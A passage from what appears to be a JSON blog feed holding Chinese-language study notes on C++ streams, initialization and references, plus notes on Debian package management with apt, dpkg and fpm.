manipulator</code>如下：</p>\n<ol>\n<li><code>endl</code>:输出后换行</li>\n<li><code>setw</code>:设置输出的宽度</li>\n<li><code>left/right</code>:通常与<code>setw</code>连用，表示左补空格&#x2F;右补空格</li>\n<li><code>setfill</code>:在宽度一定，文字没有填满处补充特定的占位符</li>\n<li><code>boolalpha</code>:用<code>true/false</code>表示<code>1/0</code></li>\n<li><code>hex</code>:将输入输出理解为 16 进制</li>\n<li><code>dec</code>:输入输出为 10 进制</li>\n<li><code>oct</code>:输入输出为 8 进制</li>\n<li><code>ws</code>:跳过所有的空格</li>\n</ol>\n<h2 id=\"Stream-异常处理\"><a href=\"#Stream-异常处理\" class=\"headerlink\" title=\"Stream 异常处理\"></a>Stream 异常处理</h2><p>在使用<code>stream</code>进行读取时，可能会出现读取异常的情况，比如读进来的值是个字符串，但是程序想把它保存到一个<code>int</code>类中，这样就产生了类型异常。我们需要在读取后使用<code>cout.fail()</code>或<code>cin.fail()</code>来判断读取是否成功，如果有异常，我们需要手动处理异常，然后用<code>cin.clear()</code>表达异常已经处理完毕。<br>:::info<br>注意，在使用<code>while</code>循环进行读取时，尽量把异常判断放在<code>while</code>循环内，如果判断到异常则退出，否则就进行下一次读取。不要把<code>while</code>循环放在条件判断中，否则可能会导致读取异常后依然在进行输出，因此尽量使用如下的结构。</p>\n<pre><code class=\"cpp\">while(true) &#123;\n  ...\n  if(cin.fail())\n    break;\n  ...\n&#125;\n</code></pre>\n<p>因为<code>stream</code>在读取到最后或读取错误时会返回<code>false</code>，而其他情况下会返回<code>stream</code>对象本身（也可以判断为<code>true</code>），因此我们可以使用<code>cin &lt;&lt; intValue &lt;&lt; doubleValue</code>之类的语句作为判断的条件，以简化上述的循环，结构如下：</p>\n<pre><code class=\"cpp\">while(cin &lt;&lt; intValue &lt;&lt; doubleVALUE) &#123;\n  ...\n  ...\n&#125;\n</code></pre>\n<p>:::</p>\n<h2 id=\"Stream-的麻烦之处\"><a href=\"#Stream-的麻烦之处\" class=\"headerlink\" title=\"Stream 的麻烦之处\"></a>Stream 的麻烦之处</h2><p>Stream 存在一个问题，如果用户多次连续读取值，而其中某一次读入的值的类型不匹配的话，则会连环影响到后面的读取。这其中的根本原因是，<code>stream</code>本身是一个附带了一个读写头的<code>buffer</code>字符数组，而每次读取后，读写后都会向后移动，下一次读取的位置是上一次读取的位置+上一次读取的长度。比如说我们需要读取一个<code>int</code>，再读取一个<code>string</code>。上一次用户输入了<code>8.265</code>,那么第一次就只会读入<code>8</code>，下一次读取从<code>.265</code>开始，导致<code>string</code>读取出错。</p>\n<p>此外，<code>cin</code>的特点是：<code>cin</code>越过一切前导空格和换行符，在读入有效字符后，遇到空格或换行符就停止读取，见如下程序：</p>\n<pre><code class=\"cpp\">#include &lt;iostream&gt;\n#include &lt;string&gt;\nint main(void)\n&#123;\n    string name;\n    string city;\n    cin &gt;&gt; name &gt;&gt; city;\n    cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;\n    cout &lt;&lt; &quot;The city is &quot; &lt;&lt; city &lt;&lt; endl;\n    return 0;\n&#125;\n</code></pre>\n<p>如果输入的第一个<code>name</code>是<code>First Last</code>，<code>city</code>输入的是<code>Wuhan</code>。由于<code>cin</code>遇到空格就停止读取，那么<code>name</code>中存储的值就是<code>First</code>，<code>city</code>中存储的值就是<code>Last</code>，而<code>Wuhan</code>依然在<code>buffer</code>中无法读取。</p>\n<p>因此，要解决标准的<code>stream</code>带来的麻烦，我们引入一个新的函数：<code>getline()</code></p>\n<h2 id=\"用getline-函数读取标准输入\"><a href=\"#用getline-函数读取标准输入\" class=\"headerlink\" title=\"用getline()函数读取标准输入\"></a>用<code>getline()</code>函数读取标准输入</h2><p><code>getline()</code>可以将输入保存在<code>string</code>中。<code>getline</code>函数的用途在于，如同他的名字，它可以一次读取一行，而<code>cin</code>每次读到空格或换行符就停止。<code>getline</code>不会忽略空格，会将其一并读入，但是<code>getline</code>遇到换行符就停止读取，并且换行符依然留存在<code>stream buffer</code>中。因此<code>getline</code>非常适合那种用户需要在这个字符串中保留空格的情况。</p>\n<p>前文我们说过，<code>cin</code>会在开始读取时越过一切前导的空格和换行符，读取有效字符后，遇到空格和换行符就停止读取，并且将其留在<code>stream buffer</code>中，以待下一次的读取。那么如果我们将<code>cin</code>和<code>getline</code>混用时，便会出现一些问题。</p>\n<p>参考如下示例：</p>\n<pre><code class=\"cpp\">int dummyInt;\nstring dummyString;\ncin &gt;&gt; dummyInt;\ngetline(cin,dummyString);\n</code></pre>\n<p><code>cin</code>首先读入了一个数，然后<strong>将换行符留在了<code>buffer</code>中</strong>，但是下一次调用<code>getline</code>时，<code>getline</code>遇到换行符就停止读取。导致读入的<code>dummyString</code>并不是我们下一次输入的字符串，而是一个空串。这都是因为上一个字符串的换行符还没有处理干净。<br>最好的解决办法是将这种原始的输入输出读取，改为调用封装好的功能完善的库函数。</p>\n<h2 id=\"用getline-函数读取文件\"><a href=\"#用getline-函数读取文件\" class=\"headerlink\" title=\"用getline()函数读取文件\"></a>用<code>getline()</code>函数读取文件</h2><p>参考之前<code>cin</code>循环从文件读取的形式，我们可以编写一个使用<code>getline</code>循环读取文件的格式:</p>\n<pre><code class=\"cpp\">ifstream capitals(&quot;capitals.txt&quot;);\nstring capital,country;\n... // check if the file is correctly opened\nwhile(getline(capitals,capital) &amp;&amp; getlien(capitals,country)) &#123;\n    ...\n    ...\n&#125;\n</code></pre>\n<h2 id=\"A-string-buffer-stringstream\"><a href=\"#A-string-buffer-stringstream\" class=\"headerlink\" title=\"A string buffer:stringstream\"></a>A string buffer:<code>stringstream</code></h2><p>:::info<br>有时候，我们想要连接字符串和数字，譬如<code>&quot;I ate&quot; + 3 &quot;peaches today&quot;</code>，可是 C++ 不允许我们拼接不一样类型的值，怎么办呢？<br>下面我们引入一个新的<code>stream</code>类：<code>stringstream</code>。通过 <code>myStringStream &lt;&lt; &quot;I ate&quot; &lt;&lt; 3 &lt;&lt; &quot;peaches today&quot;</code>,我们可以实现字符串和其他类型值的拼接。<br>:::</p>\n<p><code>stringstream</code>是一个类似于<code>cin</code>和<code>cout</code>的<code>stream</code>。和<code>ifstream/ofstream</code>一样，在使用<code>stringstream</code>前，我们需要先初始化一个<code>stringstream</code>类的对象，然后再对这个对象进行读入和写出。<code>stringstream</code>和标准<code>iostream</code>的差别在于，其写入和写出的值并不保存在程序外，而是作为程序的一个变量，可以通过调用<code>myStringStream.str()</code>随时读取。</p>\n<p>:::info<br>在使用<code>stringstream</code>之前，需要引入头文件<code>#include &lt;sstream&gt;</code><br>:::</p>\n<h1 id=\"Initialization\"><a href=\"#Initialization\" class=\"headerlink\" title=\"Initialization\"></a>Initialization</h1><h2 id=\"初始化结构体\"><a href=\"#初始化结构体\" class=\"headerlink\" title=\"初始化结构体\"></a>初始化结构体</h2><h3 id=\"方法一：用-给每个字段赋值\"><a href=\"#方法一：用-给每个字段赋值\" class=\"headerlink\" title=\"方法一：用.给每个字段赋值\"></a>方法一：用<code>.</code>给每个字段赋值</h3><pre><code class=\"cpp\"> Student s;\n s.name = &quot;Frankie&quot;;\n s.state = &quot;MN&quot;;\n s.age = 21;\n</code></pre>\n<h3 id=\"方法二：用-直接赋值\"><a href=\"#方法二：用-直接赋值\" class=\"headerlink\" title=\"方法二：用{}直接赋值\"></a>方法二：用<code>&#123;&#125;</code>直接赋值</h3><pre><code class=\"cpp\">Student s = &#123;&quot;Frankie&quot;, &quot;MN&quot;, 21&#125;;\n</code></pre>\n<h2 id=\"初始化std-pair\"><a href=\"#初始化std-pair\" class=\"headerlink\" title=\"初始化std::pair\"></a>初始化<code>std::pair</code></h2><h3 id=\"方法一：用-给每个字段赋值-1\"><a href=\"#方法一：用-给每个字段赋值-1\" class=\"headerlink\" title=\"方法一：用.给每个字段赋值\"></a>方法一：用<code>.</code>给每个字段赋值</h3><pre><code class=\"cpp\">std::pair&lt;int, string&gt; numSuffix1 = &#123;1,&quot;st&quot;&#125;;\n</code></pre>\n<h3 id=\"方法二：用-直接赋值-1\"><a href=\"#方法二：用-直接赋值-1\" class=\"headerlink\" title=\"方法二：用{}直接赋值\"></a>方法二：用<code>&#123;&#125;</code>直接赋值</h3><pre><code class=\"cpp\">std::pair&lt;int, string&gt; numSuffix2;\nnumSuffix2.first = 2;\nnumSuffix2.second = &quot;nd&quot;;\n</code></pre>\n<h3 id=\"方法三：调用std-make-pair-field1-field2-方法\"><a href=\"#方法三：调用std-make-pair-field1-field2-方法\" class=\"headerlink\" title=\"方法三：调用std::make_pair(field1,field2)方法\"></a>方法三：调用<code>std::make_pair(field1,field2)</code>方法</h3><pre><code class=\"cpp\">std::pair&lt;int, string&gt; numSuffix2 = std::make_pair(3, &quot;rd&quot;);\n</code></pre>\n<h2 id=\"初始化std-vector\"><a href=\"#初始化std-vector\" class=\"headerlink\" title=\"初始化std::vector\"></a>初始化<code>std::vector</code></h2><h3 id=\"方法一：使用-直接赋值\"><a href=\"#方法一：使用-直接赋值\" class=\"headerlink\" title=\"方法一：使用{}直接赋值\"></a>方法一：使用<code>&#123;&#125;</code>直接赋值</h3><pre><code class=\"cpp\">// a = &#123;3,5&#125;\nstd::vector&lt;int&gt; a = &#123;3,5&#125;;\n</code></pre>\n<h3 id=\"方法二：使用vector-构造函数赋值\"><a href=\"#方法二：使用vector-构造函数赋值\" class=\"headerlink\" title=\"方法二：使用vector()构造函数赋值\"></a>方法二：使用<code>vector()构造函数</code>赋值</h3><pre><code class=\"cpp\">std::vector&lt;int&gt; a(3,5);\n</code></pre>\n<p>:::info<br>这种情况下,传入的 3 和 5 是构造函数的参数，3 是元素的个数，5 是重复的元素值，<code>a=&#123;5,5,5&#125;</code><br>:::</p>\n<h2 id=\"大括号初始化-通用\"><a href=\"#大括号初始化-通用\" class=\"headerlink\" title=\"大括号初始化(通用)\"></a>大括号初始化(通用)</h2><pre><code class=\"cpp\">std::vector&lt;int&gt; vec&#123;1,3,5&#125;;\nstd::pair&lt;int, string&gt; numSuffix1&#123;1,&quot;st&quot;&#125;;\nStudent s&#123;&quot;Frankie&quot;, &quot;MN&quot;, 21&#125;;\n// less common/nice for primitive types, but possible!\nint x&#123;5&#125;;\nstring f&#123;&quot;Frankie&quot;&#125;;\n</code></pre>\n<h2 id=\"Structure-Bindings\"><a href=\"#Structure-Bindings\" class=\"headerlink\" title=\"Structure Bindings\"></a>Structure Bindings</h2><p>可以结合<code>auto</code>的自动类型推导来自动绑定值。<br>使用前：</p>\n<pre><code class=\"cpp\">auto p =\nstd::make_pair(“s”, 5);\nstring a = s.first;\nint b = s.second;\n</code></pre>\n<p>使用后：</p>\n<pre><code class=\"cpp\">auto p =\nstd::make_pair(“s”, 5);\nauto [a, b] = p;\n// a is string, b is int\n// auto [a, b] =\nstd::make_pair(...);\n</code></pre>\n<h1 id=\"References\"><a href=\"#References\" class=\"headerlink\" title=\"References\"></a>References</h1><p>:::info</p>\n<ol>\n<li><code>=</code>默认为赋值值，如果要传入引用，必须在声明引用时加上<code>&amp;</code>;</li>\n<li>修改引用时便修改了值本身，而修改复制品不修改本身;</li>\n<li>引用是变量的引用，修改引用前必须声明一个变量，无法对常量进行引用;</li>\n</ol>\n<p>:::</p>\n<pre><code class=\"cpp\">int value = 5;\nint&amp; ref = value; // the reference of value\nint copy = value; // the copy of value\n</code></pre>\n<p>此外，在使用迭代器时，如果要修改被迭代的值本身而不是他的复制品，必须使用引用，例如：</p>\n<pre><code class=\"cpp\">void shift(vector&lt;std::pair&lt;int, int&gt;&gt;&amp; nums) &#123;\n    for (auto [num1, num2]: nums) &#123;\n        num1++;\n        num2++;\n    &#125;\n&#125;\n</code></pre>\n<p>这段代码中，<code>auto [num1,num2]</code>是<code>nums</code>中每个元素的复制品，而不是本身。如果要对本身进行修改，必须使用：</p>\n<pre><code class=\"cpp\">for (auto&amp; [num1,num2] : nums)\n</code></pre>\n<h1 id=\"left-value-right-value\"><a href=\"#left-value-right-value\" class=\"headerlink\" title=\"left-value &amp; right-value\"></a>left-value &amp; right-value</h1><p>左值和右值的区别在于，左值通常来说是变量，而右值是字面量。左值可以出现在<code>=</code>的左边和右边，是在程序生命周期内长期有效。而右值作为字面量，无法在程序中长期存活，自然也不能出现在<code>=</code>的左边。</p>\n<p>:::info<br>在使用引用时，不允许传入右值，即不允许传入字面量。我们无法对一个常量进行引用，只能对左值(变量)进行引用。<br>:::</p>\n<h1 id=\"const-const-reference-copy\"><a href=\"#const-const-reference-copy\" class=\"headerlink\" title=\"const &amp; const reference&#x2F;copy\"></a>const &amp; const reference&#x2F;copy</h1><p>常量是不允许修改的量，使用<code>const</code>声明常量。常量的引用和复制也必须是常量，引用及复制前加<code>const</code>。</p>\n<h1 id=\"Containers\"><a href=\"#Containers\" class=\"headerlink\" title=\"Containers\"></a>Containers</h1><h2 id=\"STL-是什么？\"><a href=\"#STL-是什么？\" class=\"headerlink\" title=\"STL 是什么？\"></a>STL 是什么？</h2><h2 id=\"STL-Overview\"><a href=\"#STL-Overview\" class=\"headerlink\" title=\"STL Overview\"></a>STL Overview</h2><h2 id=\"为什么需要-STL？\"><a href=\"#为什么需要-STL？\" class=\"headerlink\" title=\"为什么需要 STL？\"></a>为什么需要 STL？</h2><h2 id=\"vector\"><a href=\"#vector\" class=\"headerlink\" title=\"vector\"></a>vector</h2><p><code>push_back</code> <code>insert</code> <code>pop_back</code> <code>erase</code> <code>resize</code></p>\n<h2 id=\"deque\"><a href=\"#deque\" class=\"headerlink\" title=\"deque\"></a>deque</h2><h1 id=\"Iterators-and-Pointers\"><a href=\"#Iterators-and-Pointers\" class=\"headerlink\" title=\"Iterators and Pointers\"></a>Iterators and Pointers</h1><h1 id=\"Classes\"><a href=\"#Classes\" class=\"headerlink\" title=\"Classes\"></a>Classes</h1><h1 id=\"Template-Classes-and-Const-Correctness\"><a href=\"#Template-Classes-and-Const-Correctness\" class=\"headerlink\" title=\"Template Classes and Const Correctness\"></a>Template Classes and Const Correctness</h1><h1 id=\"Template-Functions\"><a href=\"#Template-Functions\" class=\"headerlink\" title=\"Template Functions\"></a>Template Functions</h1><h1 id=\"Functions-and-Lambdas\"><a href=\"#Functions-and-Lambdas\" class=\"headerlink\" title=\"Functions and Lambdas\"></a>Functions and Lambdas</h1><h1 id=\"Midquarter-Review\"><a href=\"#Midquarter-Review\" class=\"headerlink\" title=\"Midquarter Review\"></a>Midquarter Review</h1><h1 id=\"Operators\"><a href=\"#Operators\" class=\"headerlink\" title=\"Operators\"></a>Operators</h1><h1 id=\"Special-Member-Functions\"><a href=\"#Special-Member-Functions\" class=\"headerlink\" title=\"Special Member Functions\"></a>Special Member Functions</h1><h1 id=\"Move-Semantics\"><a href=\"#Move-Semantics\" class=\"headerlink\" title=\"Move Semantics\"></a>Move Semantics</h1><h1 id=\"std-optional-and-Type-Safety\"><a href=\"#std-optional-and-Type-Safety\" class=\"headerlink\" title=\"std::optional and Type Safety\"></a>std::optional and Type Safety</h1><h1 id=\"RAII-Smart-Pointers-and-Building-C-Projects\"><a href=\"#RAII-Smart-Pointers-and-Building-C-Projects\" class=\"headerlink\" title=\"RAII, Smart Pointers, and Building C++ Projects\"></a>RAII, Smart Pointers, and Building C++ Projects</h1><h1 id=\"C-for-Data-Science-and-ML\"><a href=\"#C-for-Data-Science-and-ML\" class=\"headerlink\" title=\"C++ for Data Science and ML\"></a>C++ for Data Science and ML</h1>",
            "tags": [
                "C++"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/",
            "url": "https://salvely.github.io/blog/2023/10/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/",
            "title": "Arch Linux系统配置教程",
            "date_published": "2023-10-15T01:38:16.000Z",
            "content_html": "<h1 id=\"初始化用户和组\"><a href=\"#初始化用户和组\" class=\"headerlink\" title=\"初始化用户和组\"></a>初始化用户和组</h1><h1 id=\"权限授予\"><a href=\"#权限授予\" class=\"headerlink\" title=\"权限授予\"></a>权限授予</h1><h1 id=\"安全性配置\"><a href=\"#安全性配置\" class=\"headerlink\" title=\"安全性配置\"></a>安全性配置</h1><h1 id=\"安装基本组件\"><a href=\"#安装基本组件\" class=\"headerlink\" title=\"安装基本组件\"></a>安装基本组件</h1><h1 id=\"让系统更易用\"><a href=\"#让系统更易用\" class=\"headerlink\" title=\"让系统更易用\"></a>让系统更易用</h1>",
            "tags": [
                "Arch",
                "Linux",
                "操作系统",
                "notes",
                "配置教程"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Debian/Debain%E5%8C%85%E7%AE%A1%E7%90%86/",
            "url": "https://salvely.github.io/blog/2023/10/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Debian/Debain%E5%8C%85%E7%AE%A1%E7%90%86/",
            "title": "Debian包管理初探",
            "date_published": "2023-10-14T06:23:52.000Z",
            "content_html": "<h1 id=\"Linux-发行版\"><a href=\"#Linux-发行版\" class=\"headerlink\" title=\"Linux 发行版\"></a>Linux 发行版</h1><p>Linux 操作系统 &#x3D; Linux 内核 + 不同功能<br>但是因为内核和功能包有多种不同配置，因此 Linux 有多种发行版。<br>几种主要的发行版及其衍生是：</p>\n<ul>\n<li>Arch -&gt; Manjaro</li>\n<li>Debian -&gt; Ubuntu</li>\n<li>RHEL -&gt; Scientific Linux</li>\n</ul>\n<h1 id=\"安装软件的困惑？\"><a href=\"#安装软件的困惑？\" class=\"headerlink\" title=\"安装软件的困惑？\"></a>安装软件的困惑？</h1><p>:::default<br>我们要在 Linux 操作系统上安装一个软件，思考如下问题：<br>:::</p>\n<ul>\n<li>你需要哪些文件？如何获取他们？</li>\n<li>用户需要做多少工作？</li>\n<li>开发者需要做多少工作？</li>\n<li>在发行软件的过程中还有其他人参与工作吗？</li>\n<li>如何更新软件包？</li>\n<li>如何保证软件包来源的安全性？</li>\n</ul>\n<p>:::default<br>一个简陋的安装方案是：直接下载一堆文件。这其中包含的内容有：<br>:::</p>\n<ul>\n<li>编译好的二进制可执行文件</li>\n<li>配置信息</li>\n<li>说明文档</li>\n<li>许可证(License)</li>\n<li>其他</li>\n</ul>\n<p>:::default<br>那么问题来了：<br>:::</p>\n<ul>\n<li>我们需要哪些文件？</li>\n<li>这些文件放在哪里？</li>\n<li>如何进行环境配置？</li>\n<li>这个安装包和我的系统兼容吗？</li>\n<li>我怎么更新呢？</li>\n</ul>\n<p>:::default<br>一个进阶的安装方案是：下载一个压缩包。但是我们也面临一些问题：<br>:::</p>\n<ul>\n<li>这里面的文件是编译好的还是未编译的？</li>\n<li>软件包之间存在依赖关系怎么办？</li>\n<li>这个软件如何应对不同 Linux 发行版的需求？</li>\n<li>如何更新？如何保证更新后的版本可靠？</li>\n</ul>\n<h1 id=\"解决方案：打包！\"><a href=\"#解决方案：打包！\" class=\"headerlink\" title=\"解决方案：打包！\"></a>解决方案：打包！</h1><h2 id=\"什么是包？\"><a href=\"#什么是包？\" class=\"headerlink\" title=\"什么是包？\"></a>什么是包？</h2><p>包是 Linux 操作系统上软件的组织方式。</p>\n<h2 id=\"什么是仓库（repository）？\"><a href=\"#什么是仓库（repository）？\" class=\"headerlink\" title=\"什么是仓库（repository）？\"></a>什么是仓库（<code>repository</code>）？</h2><p>仓库是一系列软件包的合集列表。<code>Debian</code>上常见的仓库包括：</p>\n<ul>\n<li>Debian stable (all the packages available to install on a default Debian stable install)</li>\n<li>Debian security updates</li>\n<li>Debian backports</li>\n<li>Docker’s custom repositories</li>\n</ul>\n<p>其中：</p>\n<ul>\n<li>每个 Linux 发行版都维护仓库，里面列举了该仓库中可安装的所有软件包</li>\n<li>包维护者负责对开发者的软件进行打包</li>\n<li>对于不同的 Linux 发行版，打包的方式不同</li>\n</ul>\n<p>:::info<br>包和仓库区别的详细解释参考这里:</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy8xMDkwNzU4L3doYXQtYXJlLXBhY2thZ2VzLWFuZC1yZXBvc2l0b3JpZXM=\">what are packages and repositories</span></li>\n<li><a href=\"https://linux.cn/article-14994-1.html\"><code>apt-update</code>和<code>apt-upgrade</code>的区别</a><br>:::</li>\n</ul>\n<h1 id=\"包的安装过程\"><a href=\"#包的安装过程\" class=\"headerlink\" title=\"包的安装过程\"></a>包的安装过程</h1><ol>\n<li>从包列表中读取该包</li>\n<li>查看该包的所有依赖项</li>\n<li>看看依赖项中哪些包已经安装了</li>\n<li>安装未安装的依赖</li>\n<li>解压缩文件等</li>\n<li>完成一些安装后需要做的工作，如将其作为<code>service</code>启动</li>\n</ol>\n<!-- # 仓库 vs App Store\n仓库和App Store均是集中管理包的地方，但是他们略有不同。\n## 软件包更新方式\n仓库：\n- 维护者负责发布更新\n- 部分不稳定的更新会延迟\n- 用户可自己选择使用测试版\nApp Store：\n- 开发者直接向用户推送更新\n- 可能随机挑选用户测试更新\n## 安全方面和依赖管理方面\n仓库：\n- 用户可信赖开发者\nApp Store:\n- 具有隔离性，一切依赖开发者决定 -->\n\n<h1 id=\"包更新方式\"><a href=\"#包更新方式\" class=\"headerlink\" title=\"包更新方式\"></a>包更新方式</h1><ul>\n<li>部分 Linux 发行版采用<code>periodic release</code>方式，例如<code>Debian</code>，2 年一发行</li>\n<li>部分采用<code>rolling release</code>方式，例如<code>Arch</code>，发行版更新更快，但是是以稳定性为代价<br>更多内容参考这里：<span class=\"exturl\" data-url=\"aHR0cHM6Ly91dGNjLnV0b3JvbnRvLmNhL35ja3Mvc3BhY2UvYmxvZy9saW51eC9Sb2xsaW5nVnNSZWxlYXNlc05vV2lubmVy\">Rolling distribution releases versus periodic releases are a tradeoff</span></li>\n</ul>\n<h1 id=\"自动化包管理工具\"><a href=\"#自动化包管理工具\" class=\"headerlink\" title=\"自动化包管理工具\"></a>自动化包管理工具</h1><h2 id=\"apt\"><a href=\"#apt\" class=\"headerlink\" title=\"apt\"></a><code>apt</code></h2><ol>\n<li><code>apt update</code>：生成列表，显示仓库中包含哪些包</li>\n<li><code>apt upgrade</code>&#x2F;<code>apt dist-upgrade</code>：把列表中的包升级到最新版本</li>\n<li><code>apt policy &lt;packagename&gt;</code>：列举可安装的包版本</li>\n<li><code>apt -t [targetrelease] install [package]</code>：安装特定版本包</li>\n<li><code>apt install &lt;packagename&gt;</code>：安装包</li>\n<li><code>apt remove &lt;packagename&gt;</code>：卸载包</li>\n<li><code>apt search &lt;packagename&gt;</code>：搜索包</li>\n<li><code>apt install ./&lt;packagename&gt;.deb</code>：安装本地的<code>deb</code>包</li>\n<li><code>apt download &lt;packagename&gt;.deb</code>：下载包<br>:::info<br>几种不同命令的区别参考这里：</li>\n</ol>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy8xOTQ2NTEvd2h5LXVzZS1hcHQtZ2V0LXVwZ3JhZGUtaW5zdGVhZC1vZi1hcHQtZ2V0LWRpc3QtdXBncmFkZQ==\">Why use apt-get upgrade instead of apt-get dist-upgrade?</span><br>:::</li>\n</ul>\n<h2 id=\"dpkg-多用于安装本地包\"><a href=\"#dpkg-多用于安装本地包\" class=\"headerlink\" title=\"dpkg:多用于安装本地包\"></a><code>dpkg</code>:多用于安装本地包</h2><ol>\n<li><code>dpkg -i [packagefilename]</code>：安装本地包</li>\n<li><code>dpkg --remove [packagename]</code>：卸载本地包</li>\n<li><code>dpkg -I [packagename]</code>：查看本地包的更多信息</li>\n<li><code>dpkg --configure -a</code>：查看所有解压了但是还没安装的包</li>\n</ol>\n<h2 id=\"使用什么包？\"><a href=\"#使用什么包？\" class=\"headerlink\" title=\"使用什么包？\"></a>使用什么包？</h2><p>在<code>/etc/apt/sources.list</code>和<code>/etc/apt/sources.list.d</code>文件中维护镜像源：</p>\n<pre><code class=\"bash\">deb http://mirrors/debian/ stretch-backports main contrib non-free\ndeb http://mirrors/debian-security/ stretch/updates main contrib non-free\ndeb-src http://mirrors/debian-security/ stretch/updates main contrib non-free\ndeb http://mirrors/debian/ stretch-updates main contrib non-free\ndeb-src http://mirrors/debian/ stretch-updates main contrib non-free\ndeb http://mirrors/debian/ stretch main contrib non-free\ndeb-src http://mirrors/debian/ stretch main contrib non-free\n# OCF\ndeb http://apt/ stretch-backports main\ndeb-src http://apt/ stretch-backports main\ndeb http://apt/ stretch main\ndeb-src http://apt/ stretch main\ndeb http://mirrors/puppetlabs/apt/ stretch puppet\n</code></pre>\n<p>:::info<br>我个人的理解是，<code>repository</code>是指仓库名，仓库中列举了该仓库有哪些软件包。而<code>mirror list</code>指明了从哪里下载这个仓库中的软件包（网络地址）？在清华的镜像中有这个仓库，而在中科大的镜像中也有这个仓库。镜像中仓库的内容随着官方仓库内容的更新而更新？<br>关于什么是镜像，请看这里:</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy85MTMxODAvd2hhdC1hcmUtbWlycm9ycw==\">What are mirrors？</span><br>:::<br>不同的仓库中的软件版本可能不同，需要通过<code>apt policy</code>来看软件包所属的仓库。</li>\n</ul>\n<h2 id=\"每行内容如何解读？\"><a href=\"#每行内容如何解读？\" class=\"headerlink\" title=\"每行内容如何解读？\"></a>每行内容如何解读？</h2><p>:::info<br>以下内容摘自 UC Berkeley System Admin Decal 原文<br>:::</p>\n<pre><code class=\"bash\">deb http://mirrors/debian/ stretch-backports main contrib non-free\n</code></pre>\n<blockquote>\n<p><code>deb</code> is binary package source. <code>deb-src</code> indicates src packages.<br><code>http://…</code> describes the location<br><code>stretch-backports</code> means that this is for <code>Jessie stretch</code> and from a <code>backport</code> repository<br><code>main</code> means that the repo has packages licensed under <code>Debian Free Software Guidelines (DFSG)</code><br><code>contrib</code> repos have packages licensed under <code>DSFG</code> but require <code>non-free dependencies</code><br><code>non-free</code> repos have packages that do not comply with <code>DSFG</code></p>\n</blockquote>\n<h1 id=\"手动安装包\"><a href=\"#手动安装包\" class=\"headerlink\" title=\"手动安装包\"></a>手动安装包</h1><p>包中通常含有<code>Makefile</code>文件，我们可以手动的进行安装。<br>步骤：</p>\n<ol>\n<li>安装所需的相关包，例如<code>gcc</code>等</li>\n<li><code>./configure</code></li>\n<li><code>make</code></li>\n<li><code>make install</code></li>\n</ol>\n<p>不便之处：卸载麻烦。</p>\n<h1 id=\"包结构\"><a href=\"#包结构\" class=\"headerlink\" title=\"包结构\"></a>包结构</h1><p>Debian 包通常具有如下几个目录和文件：</p>\n<ul>\n<li><code>control</code>：涵盖包的元信息，例如包的大小、版本、依赖</li>\n<li><code>debian-binary</code></li>\n<li><code>etc</code>：配置文件</li>\n<li><code>md5sums</code>：文件有效性检验</li>\n<li><code>usr</code><ul>\n<li><code>bin</code>：可执行文件，要加到<code>$PATH</code>环境变量中</li>\n<li><code>share</code>：文档，man page，本地化设置<ul>\n<li><code>doc</code>：文档</li>\n<li><code>info</code>: info page</li>\n<li><code>locale</code>：本地化设置</li>\n<li><code>man</code>：man page</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"自己组包\"><a href=\"#自己组包\" class=\"headerlink\" title=\"自己组包\"></a>自己组包</h1><h2 id=\"usr-目录下几个重要的目录\"><a href=\"#usr-目录下几个重要的目录\" class=\"headerlink\" title=\"&#x2F;usr 目录下几个重要的目录\"></a>&#x2F;usr 目录下几个重要的目录</h2><ul>\n<li><code>/usr/bin</code> 二进制可执行文件</li>\n<li><code>/usr/lib</code> 相关的库</li>\n<li><code>/usr/include</code> 头文件</li>\n<li><code>/usr/share</code> 文档等等</li>\n</ul>\n<h2 id=\"打包过程：将hellopenguin-c程序打包\"><a href=\"#打包过程：将hellopenguin-c程序打包\" class=\"headerlink\" title=\"打包过程：将hellopenguin.c程序打包\"></a>打包过程：将<code>hellopenguin.c</code>程序打包</h2><h3 id=\"初始准备\"><a href=\"#初始准备\" class=\"headerlink\" title=\"初始准备\"></a>初始准备</h3><ol>\n<li>编写<code>hellopenguin.c</code>程序</li>\n</ol>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\nint main(void)\n&#123;\n    printf(&quot;Hello Penguin!\\n&quot;);\n    return 0;\n&#125;\n</code></pre>\n<ol start=\"2\">\n<li>编译<code>hellopenguin.c</code>程序，生成可执行文件<code>hellopenguin</code></li>\n</ol>\n<pre><code class=\"bash\">gcc hellopenguin.c -o hellopenguin\n</code></pre>\n<h3 id=\"打包环境准备\"><a href=\"#打包环境准备\" class=\"headerlink\" title=\"打包环境准备\"></a>打包环境准备</h3><ol>\n<li>使用<code>fpm</code>工具(<code>Ruby Gem</code>)</li>\n</ol>\n<pre><code class=\"bash\">$ sudo apt install ruby-dev\n$ sudo gem install fpm\n$ fpm -s dir -t deb -n [name here] -v [version #] -C [the directory with the /usr folder]\n</code></pre>\n<p>:::info<br>如果<code>gem</code>安装<code>fpm</code>过慢的话，需要给 ruby 环境换源，命令如下（这里使用清华源）：</p>\n<pre><code class=\"bash\"># 添加镜像源并移除默认源\ngem sources --add 